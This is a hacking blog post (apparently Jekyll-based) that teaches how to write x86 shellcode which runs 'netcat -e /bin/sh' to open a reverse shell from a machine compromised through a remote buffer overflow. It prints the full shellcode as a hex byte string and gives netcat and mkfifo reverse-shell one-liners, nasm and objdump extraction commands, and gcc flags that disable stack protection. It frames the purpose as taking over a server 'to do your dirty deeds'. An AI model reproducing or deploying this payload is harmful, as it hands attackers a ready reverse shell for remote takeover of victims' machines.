---
layout: post
title: "How to: Shellcode to reverse bind a shell with netcat"
description: "How to write an x86 shellcode to take over a remote machine"
category: "Hacking"
tags: ["System Security", "Hacking", "Shellcode"]
---
{% include JB/setup %}

Imagine you found a vulnerability in a web server and decided to take over that machine to do your dirty deeds, what do you do? Well, for starters, you have to figure out how to exploit the vulnerability at hand. In this article I will talk only about [buffer overflows](https://en.wikipedia.org/wiki/Buffer_overflow) abused to inject a [shellcode](https://en.wikipedia.org/wiki/Shellcode) and execute arbitrary commands. There can be other ways to gain access to a vulnerable remote machine, like incorrect parsing of cgi-bin requests, XSS attacks through unescaped html strings, SQL injection, etc etc.

Most of all, what I want to focus on is the **remote** nature of the attack. Local buffer overflows are easy and there are countless of other articles with detailed explanations on how to perform them (like [this](http://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow/) shameless self-plug from my old blog). Remote buffer overflows, though, are a whole other deal. Most of the time you are left stumbling in the dark trying to understand if an exploit is even possible, how the memory of your target machine could be laid out, if they have [ASLR](https://en.wikipedia.org/wiki/ASLR) and stack guards... and on top of that you cannot just spawn a shell and call it a day. What good is it to just spawn a local shell on a remote machine, if you can't log into it?

### The reverse bind of a remote shell

There are several ways to obtain access to a local shell with a remote connection. The most common of all is to open a known port with a tcp socket and bind its stdout/stderr/stdin to a newly forked shell. This way we can connect from our computer with a simple netcat command. However, this doesn't work well most of the time: most of the public-facing servers out there have only a few number of ports open to the outside world (like http(s), ftp, smtp, etc) and the remaining inbound requests are usually filtered and dropped by iptables or firewalls.

The solution to this is to use a reverse bind for your local shell. A reverse bind is a simple operation that turns the client into a server and vice-versa. Originally, you'd have opened a port on the target and waited for inbound connections (from your attacking machine). Reverse this and you'll have an open connection on your own machine waiting for the target machine to connect, this turns the attacker into the receiver waiting for some poor victim to fall into the trap.

Now, there are several shellcodes around the web for this specific type of attack, you can freely browse some of them at the [shell-storm database](http://repo.shell-storm.org/shellcode/). To me, some of them worked and some others didn't but it's always a good learning experience so check it out. The topic for today will be how to abuse netcat to do most of the job for us, I looked around the shallow web (first results of google searches) and couldn't find any example for this so... here it is!


### The netcat -e command

We will assume our target has netcat installed on the machine. This is very specific for this type of attack and if the target is even a bit concerned about security, there probably won't be any, but for the sake of learning let's assume this attack is applicable.

Traditional netcat and its [GNU counterpart](http://netcat.sourceforge.net/) have a special parameter that can be passed to the binary, the -e flag. This flag will execute anything and bind it to the connection. The traditional netcat also has a -c flag which, for our purposes, does exactly the same, but since GNU-netcat doesn't have it, we'll just use -e.

If we bind /bin/sh to netcat with -e, we are able to effectively pass our shell to the remote connection and have whoever is listening on the other side snoop into our machine (be careful when doing this!). Let's give it a try:
* In a shell on your machine run `netcat -lvp 9999` to begin listening to inbound connections. This command should be your base operation for any reverse bind shell attack, it can be your life saver.
* In a separate shell, run `netcat -e /bin/sh 127.0.0.1 9999`

You should have received a connection in the first shell you opened. Go ahead and type some shell commands like `ls` or `whoami` to confirm that it is working. You can close the connection (from any end) with `Ctrl-c` when you're done with it.

**Note**: The openbsd version of the netcat command has no -e/-c flags. As an alternative (taken from their man page) you can execute the following command: `rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 9999 > /tmp/f` This, however, is very verbose, error prone and harder to run from an injected shellcode so if your target is using this version maybe it's better to use a different shellcode.

Great! Now we know what command we want to execute on the target machine, we just need to find a way to cram it into some assembly and compile it into our payload.

### The assembly code

This is the assembly required to run our shellcode. I will explain in details how it works. (Warning: it's **Intel** syntax)

{% gist 9852347 %}

We want to execute the equivalent of the following C code:
`char *command[] = {"/bin/netcat", "-e", "/bin/sh", "127.127.127.127", "9999", NULL};`<br/>`
execve(command[0], command, NULL);`

To do so, we set up the following command string: `"/bin/netcat#-e#/bin/sh#127.127.127.127#9999#AAAABBBBCCCCDDDDEEEEFFFF"`

Ignoring the letters at the end (which I will explain later), you can see that our multiple strings are just being packed all together into a single one, separated with a `#` character. This is because we cannot have null characters inside the actual shellcode. If this were to happen, we'd end up with an incorrectly-parsed string from our victim's machine. This is very common in shellcodes so I won't get in too many details.

Regardless of where we are in memory when we run this code, we need to identify the address of the command string, so at line 1 we jump to the `forward` label (line 26) and then we immediately call the `back` label. The call instruction in assembly is used to call a function, what this does is push the return address (the address of the instruction right after the call) on top of the stack. But the address of the next instruction is exactly the address of our command string! (line 28)

Back to line 3, we pop the address into the esi register. Then we zero out the eax register (remember, we cannot just `mov eax,0` because zeroes are not allowed in our code) and start performing a patching operation to split the command string into multiple individual strings directly in memory.

Here's a picture to help explaining the following process:
![String in Memory](http://www.morgawr.eu/p/1396093148.png)

What we are doing between line 5 and line 9 is moving individual zeros (taken from the al/eax register, which we just zeroed with xor) into each location where an individual string in our command ends. This is effectively substituting `#` with `\0`. After that, we want an array of addresses to our strings (terminated with a NULL) to pass as second argument of execve(), this is where the leading string of repeating letters comes into play. In memory, arrays elements are stored in contiguous locations, so we can abuse this contiguous location of memory to store each address of each individual string.

At line 10 we move the address of `/bin/netcat` into AAAA, then we proceed from line 11 to line 18 to do the same for each piece of string. Importantly, at line 19 we store NULL (from eax) into FFFF to effectively terminate our array.

At line 20 we prepare the execve system call. Syscalls called with `int 0x80` expect arguments to be inside the registers so we store `0xb`(syscall number of execve) inside eax, esi(the address of "/bin/netcat") inside ebx, our array of strings into ecx and then a NULL in edx. We then trigger the system call and if everything went according to plan, our shellcode should give us a nice reverse shell.

#### The devil is in the details

If you notice, the shellcode uses 127.127.127.127 as IP address and 9999 as port. I chose that IP because it's a local IP (your own machine) with nice and even numbers. Usually you'll want to replace that with your own machine's public-facing IP, what you need to take care of is fixing all the offsets in the assembly code (as shown in the picture) if the length of your IP is different. This is often a bothersome and error-prone operation so be careful when re-building the shellcode, be sure to always test it locally to make sure it works.

### Compiling and testing the shellcode

You should now have the assembly code stored in a file that we'll call `shell.asm`. To compile it into binary/object code, we'll use the following nasm command: `nasm -felf32 -o shell.o shell.asm`

We can inspect the binary with objdump -D and we'll see our assembly code with the relative opcodes. We want to extract those opcodes and put them into a C string that we can execute from memory. There is a fancy one-liner script that can do that for us, taken from [here](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump):

`for i in $(objdump -d shell.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`

This will print a string that looks like this: `"\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c`<br>
`\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e`<br>
`\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62`<br>
`\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32`<br>
`\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41`<br>
`\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46"`

Now let's create a small C program that can test our shellcode:

{% gist 9853525 %}

Let's compile this, we'll need to set the proper compilation flags to turn off security measures that would just make us segfault (they are usually enabled by default nowadays, rightfully so).

`gcc shellcode.c -fno-stack-protector -z execstack -o shellcode`

Spawn another shell with `netcat -lvp 9999` and run `./shellcode`. If all went well, you should have your reverse shell running and the exploit worked.

![Shellcode worked](http://www.morgawr.eu/p/1396096315.png)

This is all for now, thank you for reading, happy hacking!

Cheers, <br>
Morg.
